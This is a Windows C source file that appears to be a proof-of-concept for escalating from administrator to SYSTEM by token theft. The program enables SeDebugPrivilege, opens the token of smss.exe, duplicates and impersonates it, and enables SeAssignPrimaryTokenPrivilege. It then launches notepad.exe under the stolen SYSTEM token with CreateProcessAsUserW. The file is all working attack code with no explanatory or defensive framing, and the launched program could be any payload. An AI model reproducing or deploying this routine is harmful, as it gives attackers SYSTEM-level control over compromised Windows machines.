#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>

DWORD find_process_by_name(const wchar_t* processname) //Find PID of specified process so that a handle may be opened.

{
	HANDLE hProcessSnap;
	PROCESSENTRY32 pe32;
	DWORD result = NULL;

	// Take a snapshot of all processes in the system.
	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

	if (INVALID_HANDLE_VALUE == hProcessSnap) return(FALSE);

	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Retrieve information about the first process,
	// and exit if unsuccessful
	if (!Process32First(hProcessSnap, &pe32))
	{
		CloseHandle(hProcessSnap);          // clean the snapshot object
		printf("!!! Failed to gather information on system processes! \n");
		return(NULL);
	}
	do
	{
		if (0 == wcscmp(processname, pe32.szExeFile))
		{
			result = pe32.th32ProcessID;
			break;
		}
	} while (Process32Next(hProcessSnap, &pe32));

	CloseHandle(hProcessSnap);
	return result;
}

int main()
{
	HANDLE OurToken;
	HANDLE phandle;
	HANDLE ptoken;
	HANDLE NewToken;
	HANDLE TargetHandle;
	int pid;

	//-----------------------------------Enable SeDebug in original Admin token------------------------------------

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &OurToken);
	LUID Luid;

	LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &Luid);
	TOKEN_PRIVILEGES NewState;

	NewState.PrivilegeCount = 1;
	NewState.Privileges[0].Luid = Luid;
	NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(OurToken, FALSE, &NewState, sizeof(NewState), NULL, NULL);
	CloseHandle(OurToken);
	//-------------------------------------------------------------------------------------------------------------

	//---------------------Open smss.exe, Impersonate, and Duplicate token to be used with CreateProcessAsUserW--------------------------
	HANDLE smssToken;
	DWORD dwProcessId = find_process_by_name(L"smss.exe");
	printf("smss PID is %lu\n", dwProcessId);
	HANDLE smssHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwProcessId);
	printf("smss Handle is %p\n", smssHandle);
	printf("smss Error is: %u\n", GetLastError());
	OpenProcessToken(smssHandle, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE, &smssToken);
	DuplicateTokenEx(smssToken, MAXIMUM_ALLOWED, 0, SecurityImpersonation, TokenImpersonation, &NewToken);
	if (ImpersonateLoggedOnUser(smssToken)) {
		printf("[*] Impersonated System!\n");
	}
	else {
		printf("[-] Failed to impersonate System... Error is: %u\n", GetLastError());
	}
	CloseHandle(smssHandle);
	CloseHandle(smssToken);
	//----------------------------------------------------------------------------------------------------------------------

	//------------------------------Messing with our thread token after impersonation----------------------------------
	printf("Before AdjustTokenPrivileges, Error is: %u\n", GetLastError());
	HANDLE hThread;
	OpenThreadToken(GetCurrentThread(), TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_PRIVILEGES, TRUE, &hThread);
	//LUID Luid;

	LookupPrivilegeValueW(NULL, SE_ASSIGNPRIMARYTOKEN_NAME, &Luid);

	NewState.PrivilegeCount = 1;
	NewState.Privileges[0].Luid = Luid;
	NewState.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(hThread, FALSE, &NewState, sizeof(NewState), NULL, NULL);
	CloseHandle(hThread);

	printf("After AdjustTokenPrivileges, Error is: %u\n", GetLastError());

	//---------------------------Spawn notepad using CreateProcessAsUserW and duplicated token-----------------------
	static STARTUPINFOW si = { sizeof(STARTUPINFOW) };
	PROCESS_INFORMATION pi;
	DWORD SessionId, l;
	printf("GetTokenInformation %d\n", GetTokenInformation(NewToken, TokenSessionId, &SessionId, sizeof(SessionId), &l));
	printf("SessionId %d\n", SessionId);
	printf("CreateProcessAsUserW %d\n", CreateProcessAsUserW(NewToken, L"C:\\windows\\system32\\notepad.exe", NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si, &pi));
	printf("Error is: %u\n", GetLastError());
	printf("Process Id: %d\n", pi.dwProcessId);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	CloseHandle(NewToken);
}

